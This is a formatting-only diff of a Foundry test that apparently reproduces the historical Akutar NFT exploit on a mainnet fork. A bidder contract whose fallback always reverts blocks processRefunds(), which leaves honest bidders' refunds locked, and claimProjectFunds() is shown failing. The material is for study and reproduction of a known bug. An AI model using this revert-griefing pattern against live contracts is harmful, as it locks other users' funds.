@@ -16,15 +16,18 @@ forge test --contracts ./src/test/AkutarNFT_exp.sol -vv
 */
 
 interface IAkutarNFT {
+
     function processRefunds() external;
 
     function bid(uint8 amount) external payable;
 
     function claimProjectFunds() external;
+
 }
+
 contract AkutarNFTExploit is Test {
-    IAkutarNFT akutarNft =
-        IAkutarNFT(0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d);
+
+    IAkutarNFT akutarNft = IAkutarNFT(0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d);
 
     function setUp() public {
         vm.createSelectFork("mainnet", 14_636_844); // fork mainnet at 14636844
@@ -36,17 +39,11 @@ contract AkutarNFTExploit is Test {
 
         vm.prank(maliciousUser); //maliciousUser makes a bid
         akutarNft.bid{value: 3.5 ether}(1);
-        console.log(
-            "honestUser Balance before Bid: ",
-            honestUser.balance / 1 ether
-        );
+        console.log("honestUser Balance before Bid: ", honestUser.balance / 1 ether);
 
         vm.prank(honestUser); //honestUser makes a bid
         akutarNft.bid{value: 3.75 ether}(1);
-        console.log(
-            "honestUser Balance after Bid: ",
-            honestUser.balance / 1 ether
-        );
+        console.log("honestUser Balance after Bid: ", honestUser.balance / 1 ether);
 
         //Set the block.height to the time when the auction was over and processRefunds() can be invoked
         //https://etherscan.io/tx/0x62d280abc60f8b604175ab24896c989e6092e496ac01f2f5399b2a62e9feaacf
@@ -54,14 +51,12 @@ contract AkutarNFTExploit is Test {
         vm.warp(1_650_674_809);
 
         vm.prank(maliciousUser);
-        try akutarNft.processRefunds() {} catch Error(string memory Exception) {
+        try akutarNft.processRefunds() {}
+        catch Error(string memory Exception) {
             console.log("processRefunds() REVERT : ", Exception);
         }
         //Since the honestUser's bid was after maliciousUser's bid, the bid amount of the honestUser is never returned due to the revert Exception
-        console.log(
-            "honestUser Balance post processRefunds: ",
-            honestUser.balance / 1 ether
-        );
+        console.log("honestUser Balance post processRefunds: ", honestUser.balance / 1 ether);
     }
 
     function testclaimProjectFunds() public {
@@ -71,9 +66,8 @@ contract AkutarNFTExploit is Test {
         vm.warp(1_650_672_435);
 
         vm.prank(ownerOfAkutarNFT);
-        try akutarNft.claimProjectFunds() {} catch Error(
-            string memory Exception
-        ) {
+        try akutarNft.claimProjectFunds() {}
+        catch Error(string memory Exception) {
             console.log("claimProjectFunds() ERROR : ", Exception);
         }
     }
@@ -81,4 +75,5 @@ contract AkutarNFTExploit is Test {
     fallback() external {
         revert("CAUSE REVERT !!!");
     }
+
 }
